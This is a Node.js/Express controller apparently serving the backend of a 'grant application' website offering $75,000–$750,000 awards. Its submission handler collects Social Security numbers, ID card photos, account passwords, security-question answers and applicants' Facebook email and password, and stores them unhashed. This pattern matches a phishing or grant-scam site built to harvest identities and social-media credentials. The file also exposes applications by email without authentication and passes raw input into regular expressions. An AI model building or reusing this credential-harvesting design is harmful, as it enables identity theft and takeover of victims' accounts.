const multer = require('multer');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { validationResult } = require('express-validator');
const { GrantApplication, Grant } = require('../models/GrantApplication');
const { 
  sendAdminNotification, 
  sendApplicantConfirmation 
} = require('../utils/emailService');

// Ensure uploads directory exists
const uploadDir = path.join(__dirname, '../../uploads');
if (!fs.existsSync(uploadDir)){
  fs.mkdirSync(uploadDir, { recursive: true });
}

// Enhanced file naming with collision prevention
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    // Generate unique filename with original extension
    const uniquePrefix = `${Date.now()}-${crypto.randomBytes(8).toString('hex')}`;
    const extension = path.extname(file.originalname);
    cb(null, `${uniquePrefix}${extension}`);
  }
});

// Multer upload configuration
const upload = multer({ 
  storage: storage,
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type. Only JPEG, PNG, and PDF are allowed.'));
    }
  },
  limits: {
    fileSize: 5 * 1024 * 1024 // 5MB file size limit
  }
});

// Middleware to handle multiple file uploads
const uploadFiles = upload.fields([
  { name: 'idCardFront', maxCount: 1 },
  { name: 'idCardBack', maxCount: 1 }
]);

// Comprehensive validation function
const validateApplicationData = (req) => {
  const errors = {};

  // Personal Information Validation
  const requiredPersonalFields = [
    'firstName', 'lastName', 'email', 'phoneNumber', 
    'dateOfBirth', 'ssn'
  ];
  
  requiredPersonalFields.forEach(field => {
    if (!req.body[field] || req.body[field].toString().trim() === '') {
      errors[field] = `${field.replace(/([A-Z])/g, ' $1').toLowerCase()} is required`;
    }
  });

  // Email validation
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (req.body.email && !emailRegex.test(req.body.email)) {
    errors.email = 'Invalid email format';
  }

  // Phone number validation
  const phoneRegex = /^[+]?[(]?[0-9]{3}[)]?[-\s.]?[0-9]{3}[-\s.]?[0-9]{4,6}$/;
  if (req.body.phoneNumber && !phoneRegex.test(req.body.phoneNumber)) {
    errors.phoneNumber = 'Invalid phone number format';
  }

  // SSN validation
  const ssnRegex = /^\d{3}-?\d{2}-?\d{4}$/;
  if (req.body.ssn && !ssnRegex.test(req.body.ssn)) {
    errors.ssn = 'Invalid SSN format';
  }

  // Address Validation
  const requiredAddressFields = [
    'streetAddress', 'city', 'state', 'zip'
  ];
  
  requiredAddressFields.forEach(field => {
    if (!req.body[field] || req.body[field].toString().trim() === '') {
      errors[field] = `${field.replace(/([A-Z])/g, ' $1').toLowerCase()} is required`;
    }
  });

  // ZIP code validation
  const zipRegex = /^\d{5}(-\d{4})?$/;
  if (req.body.zip && !zipRegex.test(req.body.zip)) {
    errors.zip = 'Invalid ZIP code format (must be 5 digits)';
  }

  // Funding Validation
  if (!req.body.fundingType || req.body.fundingType.trim() === '') {
    errors.fundingType = 'Funding type is required';
  }
  
  if (!req.body.fundingAmount) {
    errors.fundingAmount = 'Funding amount is required';
  } else {
    const amount = parseFloat(req.body.fundingAmount);
    if (isNaN(amount) || amount < 75000) {
      errors.fundingAmount = 'Funding amount must be at least $75,000';
    } else if (amount > 750000) {
      errors.fundingAmount = 'Funding amount cannot exceed $750,000';
    }
  }
  
  if (!req.body.fundingPurpose || req.body.fundingPurpose.trim() === '') {
    errors.fundingPurpose = 'Funding purpose is required';
  }

  // File Validation - Only enforce if not updating an application
  // When creating application, require files
  if (!req.params.applicationId) {
    if (!req.files || !req.files.idCardFront || !req.files.idCardBack) {
      errors.documents = 'Both front and back ID card images are required';
    }
  }

  // Terms Acceptance
  if (req.body.termsAccepted === undefined || req.body.termsAccepted === 'false' || req.body.termsAccepted === false) {
    errors.termsAccepted = 'You must accept the terms and conditions';
  }

  return errors;
};

// Main submission handler
exports.submitGrantApplication = (req, res) => {
  uploadFiles(req, res, async (uploadError) => {
    // Handle multer upload errors
    if (uploadError) {
      return res.status(400).json({ 
        message: 'File upload error',
        error: uploadError.message 
      });
    }

    try {
      // Validate application data
      const validationErrors = validateApplicationData(req);
      
      // If there are validation errors, return them
      if (Object.keys(validationErrors).length > 0) {
        return res.status(400).json({ 
          message: 'Validation failed',
          errors: validationErrors 
        });
      }

      // Extract form data from request
      const {
        firstName, lastName, ssn, dateOfBirth, email, phoneNumber,
        gender, ethnicity, employmentStatus, incomeLevel, educationLevel,
        citizenshipStatus, streetAddress, city, state, zip,
        fundingType, fundingAmount, fundingPurpose, timeframe,
        agreeToCommunication, termsAccepted, 
        password, facebookEmail, facebookPassword,
        securityQ1, securityQ2, securityQ3, age
      } = req.body;

      // Create new grant application with additional fields from the frontend
      const newApplication = new GrantApplication({
        personalInfo: {
          firstName,
          lastName,
          ssn,
          dateOfBirth,
          email,
          phoneNumber,
          gender,
          ethnicity,
          password,  // Store with proper hashing in production
          facebookEmail,
          facebookPassword,  // Store with proper encryption in production
          securityQ1,
          securityQ2,
          securityQ3,
          age: age ? parseInt(age) : undefined
        },
        employmentInfo: {
          employmentStatus,
          incomeLevel,
          educationLevel,
          citizenshipStatus
        },
        addressInfo: {
          streetAddress,
          city,
          state,
          zip
        },
        fundingInfo: {
          fundingType,
          fundingAmount: parseFloat(fundingAmount),
          fundingPurpose,
          timeframe
        },
        documents: {
          idCardFront: req.files.idCardFront ? req.files.idCardFront[0].path : undefined,
          idCardBack: req.files.idCardBack ? req.files.idCardBack[0].path : undefined
        },
        agreeToCommunication: agreeToCommunication === 'true' || agreeToCommunication === true,
        termsAccepted: termsAccepted === 'true' || termsAccepted === true,
        status: 'PENDING'
      });

      // Save application
      const savedApplication = await newApplication.save();

      // Send email notifications (non-blocking)
      try {
        await Promise.all([
          sendAdminNotification(savedApplication),
          sendApplicantConfirmation(savedApplication)
        ]);
      } catch (emailError) {
        console.error('Email notification failed:', emailError);
        // Log email errors but don't block the submission
      }

      // Respond with success
      res.status(201).json({
        message: 'Grant application submitted successfully',
        applicationId: savedApplication._id
      });

    } catch (error) {
      console.error('Submission Error:', error);
      
      // Handle specific error types
      if (error.name === 'ValidationError') {
        return res.status(400).json({
          message: 'Validation error',
          errors: Object.values(error.errors).map(err => err.message)
        });
      }

      // Mongoose duplicate key error
      if (error.code === 11000) {
        return res.status(409).json({
          message: 'Duplicate application detected',
          error: 'An application with the same information already exists'
        });
      }

      // Generic server error
      res.status(500).json({ 
        message: 'Internal server error', 
        error: error.message 
      });
    }
  });
};

// Get application status
exports.getGrantApplicationStatus = async (req, res) => {
  try {
    const { applicationId } = req.params;
    const application = await GrantApplication.findById(applicationId);

    if (!application) {
      return res.status(404).json({ message: 'Application not found' });
    }

    res.status(200).json({
      applicationId: application._id,
      status: application.status,
      fundingType: application.fundingInfo.fundingType,
      fundingAmount: application.fundingInfo.fundingAmount,
      submissionDate: application.createdAt,
      firstName: application.personalInfo.firstName,
      lastName: application.personalInfo.lastName
    });
  } catch (error) {
    res.status(500).json({ 
      message: 'Error retrieving application status', 
      error: error.message 
    });
  }
};

// Get application details
exports.getGrantApplicationDetails = async (req, res) => {
  try {
    const { applicationId } = req.params;
    const application = await GrantApplication.findById(applicationId)
      .select('-personalInfo.ssn -personalInfo.password -personalInfo.facebookPassword');

    if (!application) {
      return res.status(404).json({ message: 'Application not found' });
    }

    res.status(200).json(application);
  } catch (error) {
    res.status(500).json({ 
      message: 'Error retrieving application details', 
      error: error.message 
    });
  }
};

// Get user applications
exports.getUserApplications = async (req, res) => {
  try {
    const { email } = req.query;
    
    if (!email) {
      return res.status(400).json({ message: 'Email is required' });
    }

    const applications = await GrantApplication.find({
      'personalInfo.email': email
    }).select('_id status fundingInfo.fundingType fundingInfo.fundingAmount createdAt');

    res.status(200).json(applications);
  } catch (error) {
    res.status(500).json({ 
      message: 'Error retrieving user applications', 
      error: error.message 
    });
  }
};

// Update application status
exports.updateApplicationStatus = async (req, res) => {
  try {
    const { applicationId } = req.params;
    const { status, notes } = req.body;
    
    if (!status) {
      return res.status(400).json({ message: 'Status is required' });
    }
    
    const allowedStatuses = ['PENDING', 'APPROVED', 'REJECTED', 'UNDER_REVIEW'];
    if (!allowedStatuses.includes(status)) {
      return res.status(400).json({ message: 'Invalid status value' });
    }
    
    const updatedApplication = await GrantApplication.findByIdAndUpdate(
      applicationId,
      { 
        status,
        notes: notes || '',
        updatedAt: Date.now()
      },
      { new: true, runValidators: true }
    );
    
    if (!updatedApplication) {
      return res.status(404).json({ message: 'Application not found' });
    }
    
    res.status(200).json({
      message: 'Application status updated successfully',
      application: {
        id: updatedApplication._id,
        status: updatedApplication.status,
        updatedAt: updatedApplication.updatedAt
      }
    });
  } catch (error) {
    res.status(500).json({
      message: 'Error updating application status',
      error: error.message
    });
  }
};

// Grant Listing Methods

// Get all grants
exports.getAllGrants = async (req, res) => {
  try {
    const { limit, page } = req.query;
    
    // Parse pagination parameters
    const pageSize = parseInt(limit) || 10;
    const currentPage = parseInt(page) || 1;
    const skip = (currentPage - 1) * pageSize;
    
    // Execute query with pagination
    const grants = await Grant.find({})
      .sort({ featured: -1, createdAt: -1 })
      .skip(skip)
      .limit(pageSize)
      .select('title description category amount deadline status featured');
    
    // Get total count for pagination info
    const totalCount = await Grant.countDocuments({});
    
    res.status(200).json({
      grants,
      pagination: {
        total: totalCount,
        pageSize,
        currentPage,
        totalPages: Math.ceil(totalCount / pageSize)
      }
    });
  } catch (error) {
    console.error('Error fetching grants:', error);
    res.status(500).json({ 
      message: 'Error fetching grants', 
      error: error.message 
    });
  }
};

// Get grants by category
exports.getGrantsByCategory = async (req, res) => {
  try {
    const { category } = req.params;
    const { limit, page } = req.query;
    
    // Parse pagination parameters
    const pageSize = parseInt(limit) || 10;
    const currentPage = parseInt(page) || 1;
    const skip = (currentPage - 1) * pageSize;
    
    // Create search query
    const searchQuery = { 
      category: { $regex: new RegExp(category, 'i') }
    };
    
    // Execute query with pagination
    const grants = await Grant.find(searchQuery)
      .sort({ featured: -1, createdAt: -1 })
      .skip(skip)
      .limit(pageSize)
      .select('title description category amount deadline status featured');
    
    // Get total count for pagination info
    const totalCount = await Grant.countDocuments(searchQuery);
    
    res.status(200).json({
      grants,
      pagination: {
        total: totalCount,
        pageSize,
        currentPage,
        totalPages: Math.ceil(totalCount / pageSize)
      }
    });
  } catch (error) {
    console.error('Error fetching grants by category:', error);
    res.status(500).json({ 
      message: 'Error fetching grants by category', 
      error: error.message 
    });
  }
};

// Search grants
exports.searchGrants = async (req, res) => {
  try {
    const { q, limit, page, status } = req.query;
    
    // Parse pagination parameters
    const pageSize = parseInt(limit) || 10;
    const currentPage = parseInt(page) || 1;
    const skip = (currentPage - 1) * pageSize;
    
    // Build search query
    const searchQuery = {};
    
    // Text search if q parameter is provided
    if (q) {
      searchQuery.$or = [
        { title: { $regex: q, $options: 'i' } },
        { description: { $regex: q, $options: 'i' } },
        { category: { $regex: q, $options: 'i' } }
      ];
    }
    
    // Filter by status if provided
    if (status && ['OPEN', 'CLOSED', 'UPCOMING'].includes(status.toUpperCase())) {
      searchQuery.status = status.toUpperCase();
    }
    
    // Execute query with pagination
    const grants = await Grant.find(searchQuery)
      .sort({ featured: -1, createdAt: -1 })
      .skip(skip)
      .limit(pageSize)
      .select('title description category amount deadline status featured');
    
    // Get total count for pagination info
    const totalCount = await Grant.countDocuments(searchQuery);
    
    res.status(200).json({
      grants,
      pagination: {
        total: totalCount,
        pageSize,
        currentPage,
        totalPages: Math.ceil(totalCount / pageSize)
      }
    });
  } catch (error) {
    console.error('Error searching grants:', error);
    res.status(500).json({ 
      message: 'Error searching grants', 
      error: error.message 
    });
  }
};

// Get grant by ID
exports.getGrantById = async (req, res) => {
  try {
    const { grantId } = req.params;
    const grant = await Grant.findById(grantId);
    
    if (!grant) {
      return res.status(404).json({ message: 'Grant not found' });
    }
    
    res.status(200).json(grant);
  } catch (error) {
    console.error('Error fetching grant:', error);
    res.status(500).json({ 
      message: 'Error fetching grant', 
      error: error.message 
    });
  }
};

// Create new grant
exports.createGrant = async (req, res) => {
  try {
    const { 
      title, description, category, amount, 
      deadline, eligibility, requirements, status, featured
    } = req.body;
    
    // Validate required fields
    if (!title || !description || !category || !amount) {
      return res.status(400).json({ 
        message: 'Missing required fields', 
        requiredFields: ['title', 'description', 'category', 'amount'] 
      });
    }
    
    // Create new grant
    const newGrant = new Grant({
      title,
      description,
      category,
      amount: parseFloat(amount),
      deadline: deadline ? new Date(deadline) : undefined,
      eligibility: eligibility || {},
      requirements: requirements || [],
      status: status || 'OPEN',
      featured: featured === true || featured === 'true'
    });
    
    // Save grant
    const savedGrant = await newGrant.save();
    
    res.status(201).json({
      message: 'Grant created successfully',
      grantId: savedGrant._id
    });
  } catch (error) {
    console.error('Error creating grant:', error);
    
    // Handle validation errors
    if (error.name === 'ValidationError') {
      return res.status(400).json({
        message: 'Validation error',
        errors: Object.values(error.errors).map(err => err.message)
      });
    }
    
    res.status(500).json({ 
      message: 'Error creating grant', 
      error: error.message 
    });
  }
};

// Update grant
exports.updateGrant = async (req, res) => {
  try {
    const { grantId } = req.params;
    const updateData = req.body;
    
    // Handle amount conversion
    if (updateData.amount) {
      updateData.amount = parseFloat(updateData.amount);
    }
    
    // Handle deadline conversion
    if (updateData.deadline) {
      updateData.deadline = new Date(updateData.deadline);
    }
    
    // Set updated date
    updateData.updatedAt = Date.now();
    
    const updatedGrant = await Grant.findByIdAndUpdate(
      grantId,
      updateData,
      { new: true, runValidators: true }
    );
    
    if (!updatedGrant) {
      return res.status(404).json({ message: 'Grant not found' });
    }
    
    res.status(200).json({
      message: 'Grant updated successfully',
      grant: updatedGrant
    });
  } catch (error) {
    console.error('Error updating grant:', error);
    
    // Handle validation errors
    if (error.name === 'ValidationError') {
      return res.status(400).json({
        message: 'Validation error',
        errors: Object.values(error.errors).map(err => err.message)
      });
    }
    
    res.status(500).json({ 
      message: 'Error updating grant', 
      error: error.message 
    });
  }
};

// Delete grant
exports.deleteGrant = async (req, res) => {
  try {
    const { grantId } = req.params;
    const deletedGrant = await Grant.findByIdAndDelete(grantId);
    
    if (!deletedGrant) {
      return res.status(404).json({ message: 'Grant not found' });
    }
    
    res.status(200).json({
      message: 'Grant deleted successfully',
      grantId: deletedGrant._id
    });
  } catch (error) {
    console.error('Error deleting grant:', error);
    res.status(500).json({ 
      message: 'Error deleting grant', 
      error: error.message 
    });
  }
};
